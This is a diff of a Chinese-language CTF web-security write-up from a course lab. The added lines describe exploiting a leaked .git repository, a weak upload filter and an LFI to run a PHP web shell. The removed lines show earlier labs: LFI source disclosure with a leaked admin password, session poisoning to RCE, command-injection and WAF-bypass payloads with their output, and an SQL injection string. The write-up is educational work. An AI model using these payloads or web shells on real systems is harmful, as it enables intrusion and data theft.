@@ -1,136 +1,76 @@
 # 0x02 Web Writeup
 
-## Cat shop [Lab 20]
+## Homework - Imgura [100]
 
-點進[網址](http://splitline.tw:8100)後可以看到有個 `FLAG` 選項是可以選的，但在前端頁面中是被 Disabled 掉的：
+- 題目網址：[https://imgura.chal.h4ck3r.quest/](https://imgura.chal.h4ck3r.quest/)
+- 助教給的提示：`Information Leak`、`Upload`、`LFI` (老實說提示的滿兇的XD)
+- Imgura 資料夾中的項目：
+  - `leak_src.zip`：透過 `.git` 還原出的原始檔
+  - `prev_commit_src`：還原上一個 Commit 的 Source Code
+  - `Retro9IsMe.png.php`：攻擊 Payload
+  - `Retro9IsMe.png`：偽裝圖片
 
-![Cat shop Homepage](./resources/Screen%20Shot%202021-10-28%20at%202.51.04%20PM.png)
+看到提示其實就可以猜到幾個 Information Leak 的方向，有幾種可能如 Error 的 Debug 資訊沒關、robots.txt 裡或 source code 裡有些 Route 沒拿掉或沒辦法拿掉等等。但這題的 Information Leak 肇因於部署時是直接透過 git pull 後在專案根目錄直接起一個 Http Server，讓攻擊者可以存取 `.git` 資料夾還原出完整的 Source Code
 
-仔細觀察一下頁面中其他選項可以看到這幾個商品都是有個 id 的，而且 id 數字有個非常明顯的順序，所以我們可以合理推斷 FLAG 這個商品的 id 是 `5430`。接下來觀察一下購買頁面可以發現送出的 Payload 中有夾帶 id 這一項及該 item 的金額數量，看起來**物品資訊是記在前端的**，運氣好的話可以直接透過修改 payload 的數值達到 bypass frontend restriction 的目的。
+![Imgura git config](./resources/Screen%20Shot%202021-10-28%20at%204.09.23%20PM.png)
 
-![Cat shop Buying Page](./resources/Screen%20Shot%202021-10-28%20at%202.59.21%20PM.png)
+透過 [Scrabble](https://github.com/denny0223/scrabble) 去還原後就可以得到整個網頁的原始碼。從 `git log` 中可以看到這個 Repo 最近的 commit 把 Dev Page 刪除了：
 
-## 喵 site [Lab 20]
+![Git src log](./resources/Screen%20Shot%202021-10-28%20at%204.14.37%20PM.png)
 
-LFI 的問題。調整 `page` query 後後臺會跳出 include 的錯誤訊息：
+我們只要透過指令 `git reset HEAD^ --hard` 回到 First commit，就可以得到所有 Dev 的程式碼了。
 
-![Site LFI Leak Error Message](./resources/Screen%20Shot%202021-10-28%20at%203.01.37%20PM.png)
+從這些程式碼中可以看到，這個頁面「曾經」有一個 dev_test_page 的存在，裏面有 Upload 功能以及 Share Image 的功能。為什麼是說「曾經」呢？理論上這些檔案本不應該存在在根目錄了，但實際上切到 `https://imgura.chal.h4ck3r.quest/dev_test_page/?page=pages/share` 路徑上仍可以看到舊的頁面，這邊真的滿起怪的，也許是題目故意設計的吧。
 
-所以透過 `php://filter` 可以撈出 admin.php 的原始碼：
+![Imgura dev src page](./resources/Screen%20Shot%202021-10-28%20at%204.22.26%20PM.png)
+
+總之分析過程式碼後可以得到兩個漏洞，分別是**上傳 Filter 實作上的缺陷**以及**HomePage 時做切換頁面的方法導致的 LFI 漏洞**。
+
+Filter 功能的漏洞如下：
 
 ```php
-# Request http://splitline.tw:8400/?page=php://filter/read=convert.base64-encode/resource=admin
+# 這裏居然預設是取第二個 Split 元素，直接預設整個檔名中只會有一個 dot
+# bypass 的方法只要在檔名中多加一個 .png 或其他可接受的 extension 就可了
+$extension = strtolower(explode(".", $filename)[1]);
 
-# PGgxPkFkbWluIFBhbmVsPC9oMT4KPGZvcm0+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHZhbHVlPSJhZG1pbiI+CiAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgo8L2Zvcm0+Cgo8P3BocAokYWRtaW5fYWNjb3VudCA9IGFycmF5KCJ1c2VybmFtZSIgPT4gImFkbWluIiwgInBhc3N3b3JkIiA9PiAia3FxUEZPYnd4VThIWW84RTVRZ05MaGRPeHZabXRQaHlCQ3lEeEN3cHZBUSIpOwppZiAoCiAgICBpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9HRVRbJ3Bhc3N3b3JkJ10pICYmCiAgICAkX0dFVFsndXNlcm5hbWUnXSA9PT0gJGFkbWluX2FjY291bnRbJ3VzZXJuYW1lJ10gJiYgJF9HRVRbJ3Bhc3N3b3JkJ10gPT09ICRhZG1pbl9hY2NvdW50WydwYXNzd29yZCddCikgewogICAgZWNobyAiPGgxPkxPR0lOIFNVQ0NFU1MhPC9oMT48cD4iLmdldGVudignRkxBRycpLiI8L3A+IjsKfQoKPz4=
-
-# Decode
-<h1>Admin Panel</h1>
-<form>
-    <input type="text" name="username" value="admin">
-    <input type="password" name="password">
-    <input type="submit" value="Submit">
-</form>
-
-<?php
-$admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ");
-if (
-    isset($_GET['username']) && isset($_GET['password']) &&
-    $_GET['username'] === $admin_account['username'] && $_GET['password'] === $admin_account['password']
-) {
-    echo "<h1>LOGIN SUCCESS!</h1><p>".getenv('FLAG')."</p>";
+if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) {
+    die("Invalid file extension: $extension.");
 }
 
-?>
+# 這個 check 方法會 Check 檔案的第一個 File，假設今天這個檔案是由兩種不同的檔案接在一起的話，就可以 Bypass 掉這條限制
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$type = finfo_file($finfo, $_FILES['image_file']['tmp_name']);
+finfo_close($finfo);
+if (!in_array($type, ['image/png', 'image/jpeg'])) {
+    die('Not an valid image.');
+}
+
+# 濾掉 <?php ....
+# 這個就有一堆 Bypass 方法了，黑名單永遠是最不好的方法
+$content = file_get_contents($_FILES['image_file']['tmp_name']);
+if (stripos($content, "<?php") !== false) {
+    die("Hacker?");
+}
 ```
 
-## HakkaMD [Lab 20]
+其他限制就滿簡單的如檔案大小、width、height 等等就滿簡單可以 Bypass 掉。
 
-這題也是 LFI 的問題，但這次目標除了讀出 Source Code 以外，還要達成 RCE 的目的。有問題的 Query 是 `module`，裡面填得值會直接丟到 `include` 裡。以下是三個頁面的 Source Code
+第二個漏洞來自於 index page 實作 router 的方法導致的 LFI:
 
-```php
-# http://splitline.tw:8401/?module=php://filter/read=convert.base64-encode/resource=module/list.php
-<h1 class="title">筆記列表</h1>
-<?php foreach ($_SESSION['notes'] as $note) : ?>
-    <div class="box">
-        <?= nl2br($note) ?>
-    </div>
-<?php endforeach; ?>
-```
-
-```php
-# http://splitline.tw:8401/?module=php://filter/read=convert.base64-encode/resource=module/home.php
-<div class="box">
-    <h1 class="title">HakkaMD</h1>
-    <p class="subtitle">一個簡單的筆記平台</p>
-    <form method="POST" action="/?module=module/post.php">
-        <div class="field">
-            <div class="control">
-                <textarea class="textarea" type="text" name="note" placeholder="Write your note here..."></textarea>
-            </div>
-        </div>
-        <button class="button is-info is-fullwidth">Post</button>
-    </form>
+```html
+<div class="hero-body">
+  <?php
+  include ($_GET['page'] ?? 'pages/main') . ".php";
+  ?>
 </div>
 ```
 
-```php
-# http://splitline.tw:8401/?module=php://filter/read=convert.base64-encode/resource=module/post.php
-<?php
-if (isset($_POST['note'])) $_SESSION['notes'][] = $_POST['note'];
-header("Location: /?module=module/list.php");
-```
+所以最終的攻擊手法：
 
-這幾個檔案就可以看到，我們輸進去 textbox 的東西會存在 session 裡，所以我們只要想辦法 poison session 的檔案就行了。
+1. 在一個 legit 的 png (`Retro9IsMe.png`) 檔後新增一小段 php script (`<?=system($_GET["cmd"]);?>`)
+2. 改檔名成 `Retro9IsMe.png.php`
+3. 把檔案透過上傳功能上傳到伺服器
+4. 把首頁 `page` query 改成檔案位置，並加上 cmd query 執行 Commmad
+5. Navigator 後找到 Flag 檔案
 
-```
-http://splitline.tw:8401/?module=/tmp/sess_fc55d1565cd147368b5db214476fd776&cmd=cat%20%2Fflag_aff6136bbef82137
-```
-
-## DNS Lookup Tool [Lab 5]
-
-```txt
-Payload: '; ls -al /; cat /flag_44ebd3936a907d59; #
-Output:
-total 84
-drwxr-xr-x   1 root root 4096 Oct 22 04:36 .
-drwxr-xr-x   1 root root 4096 Oct 22 04:36 ..
--rwxr-xr-x   1 root root    0 Oct 22 04:36 .dockerenv
-drwxr-xr-x   1 root root 4096 Aug 18 12:33 bin
-drwxr-xr-x   2 root root 4096 Apr 10  2021 boot
-drwxr-xr-x   5 root root  340 Oct 22 04:36 dev
-drwxr-xr-x   1 root root 4096 Oct 22 04:36 etc
--rw-r--r--   1 1000 1000   29 Oct 22 01:27 flag_44ebd3936a907d59
-drwxr-xr-x   2 root root 4096 Apr 10  2021 home
-drwxr-xr-x   1 root root 4096 Aug 18 12:27 lib
-drwxr-xr-x   2 root root 4096 Aug 16 00:00 lib64
-drwxr-xr-x   2 root root 4096 Aug 16 00:00 media
-drwxr-xr-x   2 root root 4096 Aug 16 00:00 mnt
-drwxr-xr-x   2 root root 4096 Aug 16 00:00 opt
-dr-xr-xr-x 295 root root    0 Oct 22 04:36 proc
-drwx------   1 root root 4096 Aug 26 23:37 root
-drwxr-xr-x   1 root root 4096 Aug 18 12:33 run
-drwxr-xr-x   1 root root 4096 Aug 18 12:33 sbin
-drwxr-xr-x   2 root root 4096 Aug 16 00:00 srv
-dr-xr-xr-x  13 root root    0 Oct 22 04:36 sys
-drwxrwxrwt   1 root root 4096 Oct 14 11:45 tmp
-drwxr-xr-x   1 root root 4096 Aug 16 00:00 usr
-drwxr-xr-x   1 root root 4096 Aug 18 12:27 var
-FLAG{B4by_c0mmand_1njection!}
-```
-
-## DNS Lookup Tool WAF [Lab 25]
-
-```txt
-Payload: '+$(cat /fla*)+'
-Output:
-Host +FLAG{Y0U_\$\(Byp4ssed\)_th3_`waf`}+ not found: 2(SERVFAIL)
-```
-
-## Log me in [Lab 5]
-
-Sqli
-
-```txt
-Payload username = ') or 1=1; --
-Payload password = fsdaf
-```
+## Homework - Screensaver [200]
